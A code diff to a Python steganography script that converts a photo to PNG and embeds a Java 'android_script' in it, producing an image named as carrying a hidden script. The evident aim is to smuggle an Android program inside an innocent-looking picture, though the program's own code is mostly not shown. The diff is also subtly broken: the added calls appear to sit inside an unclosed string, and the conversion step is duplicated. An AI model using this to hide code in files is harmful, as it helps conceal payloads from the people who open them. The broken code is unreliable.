@@ -1,4 +1,17 @@
 from PIL import Image
+import os
+
+# Function to check the format of the image and convert to PNG if necessary
+def convert_to_png(image_path):
+    img = Image.open(image_path)
+    if img.format != "PNG":
+        output_path = os.path.splitext(image_path)[0] + ".png"
+        img.save(output_path, format="PNG")
+        print(f"Image converted to PNG format: {output_path}")
+        return output_path
+    else:
+        print("Image is already in PNG format.")
+        return image_path
 
 # Function to encode text into image
 def encode_text_in_image(image_path, text, output_path):
@@ -36,10 +49,13 @@ def encode_text_in_image(image_path, text, output_path):
 # Path to the original image
 image_path = "/home/kali/Downloads/aurora-1185466_1920.jpg"
 
-# Output path for the image with hidden script
-output_image_path = "/home/kali/Downloads/aurora_with_hidden_script.jpg"
+# Convert the image to PNG if necessary
+image_path = convert_to_png(image_path)
 
-# Android script to be hidden within the image
+# Output path for the image with hidden script
+output_image_path = "/home/kali/Downloads/aurora_with_hidden_script.png"
+
+# Script to be hidden within the image
 android_script = """
 import android.Manifest;
 import android.content.Context;
@@ -225,3 +241,9 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 }
+
+# Convert the image to PNG if necessary
+image_path = convert_to_png(image_path)
+
+# Encode the script into the image
+encode_text_in_image(image_path, android_script, output_image_path)
